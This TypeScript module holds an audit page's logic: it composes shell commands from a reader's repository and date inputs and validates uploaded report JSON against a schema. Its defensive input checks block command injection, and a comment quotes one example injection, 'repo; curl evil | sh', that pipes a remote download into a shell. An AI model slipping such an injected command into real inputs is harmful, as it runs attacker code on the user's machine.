// The audit views' pure logic, kept out of the components so it can be tested by `node --test` with no
// test framework, no JSDOM and no new dependency — `audit.test.ts` imports this file directly.
//
// That is not only convenience. Two of the three functions below carry a property that is not about
// appearance:
//
// * `compose` produces text a reader pastes into their own shell. A repository field is therefore a
//   command fragment, not display data, and `repo; curl evil | sh` typed into it would compose into a
//   line that runs both. It refuses to compose unless the value is a single shell-safe word.
// * `decodeReport` decides whether a file the reader chose is a report at all. Without the schema check
//   a JSON file that is not a report renders as a report with every section empty, and empty sections
//   read as "your submission has no problems".
//
// A guard with no test is a memory (`feedback_test_suite_over_memory`), and neither of these can be
// checked by the Python publish gate: the gate reads the built bundle's bytes, not its behaviour.
//
// WHY THE REFUSALS ARE IDENTITIES AND NOT SENTENCES
//
// Both functions used to return English prose. A refusal is not diagnostic output — it is an instruction
// to the reader about what to type next — so it has to exist in both languages, and a pure function that
// imports nothing from React must not also decide which language a reader wants. So each refusal returns
// a `Msg`: the key of the sentence plus the values to substitute, rendered by whichever view is showing
// it. The tests then pin the refusal's IDENTITY rather than a word in its wording, which is the stronger
// assertion of the two: `includes("hyphen")` also passed for a sentence that said the opposite.

import type { AuditReport } from "./types";
import type { Key } from "./strings";

/** A sentence this module has decided to say, named rather than written. `vars` holds only values that
 *  came from the reader or from the data — never a clause, because a clause assembled here would be
 *  assembled in one language's grammar. */
export type Msg = { key: Key; vars?: Record<string, string> };

/** `measured_true` -> `st-measured_true`, derived rather than mapped. `check_site_invariants.py`'s
 *  `audit_vocabularies_are_styled` arm asserts every member of `controls.json`'s status vocabulary has a
 *  matching rule in the served stylesheet, because a status with no rule renders as an unremarkable
 *  badge — and for `not_measured` the unremarkable reading is "nothing wrong here", which is the one
 *  thing it does not mean. */
export const statusClass = (s: string) => `st-${s.toLowerCase()}`;
export const obsClass = (o: string) => `o-${o.toLowerCase()}`;

/** A shell-safe single word: what a repository URL, a local path or a date can consist of and still be
 *  pasted into a command line unquoted. Deliberately narrow — `~`, `@`, `:` and `/` are in because
 *  `git@github.com:org/repo.git` and `~/src/repo` are the two shapes a reader will actually paste. */
const SAFE_WORD = /^[A-Za-z0-9@._:/~+-]+$/;
const ISO_DAY = /^\d{4}-\d{2}-\d{2}$/;

export const REPORT_SCHEMA = "grx-audit-report/1";

export type Composed = { lines: string[]; refusal: Msg | null; substituted: boolean };

/** Substitute the reader's values into the commands the payload published, or refuse and say why.
 *
 * The command templates are NOT written into this file: they come from `audit.json`, which the build
 * derived by running the two programs. A copy here would be a second source for what the tools are
 * called, and it would go stale the first time a flag was renamed — silently, because a wrong command on
 * a web page produces its error in somebody else's terminal.
 *
 * Refusing beats quoting. A reader who edits a quoted line afterwards silently loses the quoting, and
 * the refusal is the more useful answer anyway: a path with a semicolon in it is not a repository.
 */
export function compose(commands: string[], target: string, asOf: string): Composed {
  const t = target.trim();
  const d = asOf.trim();

  if (t && !SAFE_WORD.test(t)) {
    const bad = [...t].find((ch) => !SAFE_WORD.test(ch)) ?? " ";
    // A space gets its own sentence rather than being quoted into the other one: `" "` between quotation
    // marks is the one character a reader cannot see, and "the character ' ' is not something a path
    // contains" reads as a bug in the page.
    return {
      lines: commands,
      substituted: false,
      refusal:
        bad === " "
          ? { key: "aud.refuse.space" }
          : { key: "aud.refuse.char", vars: { ch: JSON.stringify(bad) } },
    };
  }
  if (t.startsWith("-")) {
    return { lines: commands, substituted: false, refusal: { key: "aud.refuse.hyphen" } };
  }
  if (d && !ISO_DAY.test(d)) {
    return { lines: commands, substituted: false, refusal: { key: "aud.refuse.date" } };
  }

  const lines = commands.map((c) => {
    let out = t ? c.split("<your-repo>").join(t) : c;
    // The date is optional AND its absence is meaningful: `report.py` reads no clock, so omitting
    // `--as-of` is what makes the same submission produce a byte-identical report. An empty field
    // therefore removes the flag rather than substituting today, which no page here is entitled to know.
    out = d ? out.split("<YYYY-MM-DD>").join(d) : out.replace(/\s--as-of\s+<YYYY-MM-DD>/, "");
    return out;
  });
  return { lines, refusal: null, substituted: Boolean(t) };
}

/** Parse a report file the reader chose. Returns the report or a sentence naming what is wrong with it.
 *
 * The schema check is not decoration: `report.py` writes `schema: "grx-audit-report/1"`, and a file
 * without it is either from a different tool — an `inventory.json` is the likely mistake, since it sits
 * beside the report and has a similar shape — or from a version whose fields this page would render as
 * missing. Both are reported rather than rendered. */
export function decodeReport(text: string): { report: AuditReport } | { error: Msg } {
  let parsed: unknown;
  try {
    parsed = JSON.parse(text);
  } catch (e) {
    // The parser's own message is passed through as a value and stays in English wherever the sentence
    // around it is translated: it is `JSON.parse`'s diagnostic, and a reader searching for it needs the
    // string the engine produced.
    return {
      error: { key: "aud.rep.notJson", vars: { why: e instanceof Error ? e.message : String(e) } },
    };
  }
  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) {
    return { error: { key: "aud.rep.notObject" } };
  }
  const r = parsed as Partial<AuditReport>;
  if (r.schema !== REPORT_SCHEMA) {
    return {
      error: {
        key: "aud.rep.wrongSchema",
        vars: { got: JSON.stringify(r.schema ?? null), want: JSON.stringify(REPORT_SCHEMA) },
      },
    };
  }
  if (!Array.isArray(r.controls) || !Array.isArray(r.recommendations)) {
    return { error: { key: "aud.rep.noArrays" } };
  }
  return { report: parsed as AuditReport };
}
